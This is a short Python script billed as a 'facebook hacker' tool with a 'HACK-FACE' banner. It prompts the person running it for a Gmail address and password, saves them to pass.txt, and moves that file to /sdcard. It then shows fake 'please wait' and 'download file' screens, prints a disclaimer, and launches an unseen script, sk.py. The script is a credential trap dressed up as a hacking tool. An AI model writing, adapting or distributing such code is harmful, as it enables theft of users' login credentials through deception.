#facebook hacker 
import os
import pyfiglet
import sys
import time
os.system('clear')
v  = '\033[0;35m'
W  = '\33[0m'
R  = '\33[1;31m'
G  = '\33[1;32m'
O  = '\33[1;33m'
B  = '\33[1;34m'
P  = '\33[1;35m'
C  = '\33[1;36m'
GR = '\33[1;37m'
rs = '\033[0;101m'
b_b = '\033[4;31m'
cc = '\033[0;91m'
bnr=pyfiglet.figlet_format('HACK-FACE')
print(R+bnr)
test =('pass.txt')
for x in range(1):
    print(B+' - logen facebook ')
    b = input(G+' - enter Gmail : ')
    m = input(' - enter Password : ')
    x = open(f'{test}','w')
    x.write(b +'\n')
    x.write(m +'\n')
x.close()
os.system('mv pass.txt /sdcard')
os.system('')
time.sleep(1)
os.system('clear')
mc = 'please wait ... '
def ex(s):
    for c in s :
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(330. / 50)
print(G+'please wait ... ')
print(R+'download file ...')
ex (''' ''')
os.system('clear')
def pp(s):
    for c in s + '\n' :
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(10. / 150)
pp(G+'''I am not responsible for the error in use ''')
pp(R+'<Hacker facebook>')

tr =('sk.py')
os.system(f'python2 {tr}')






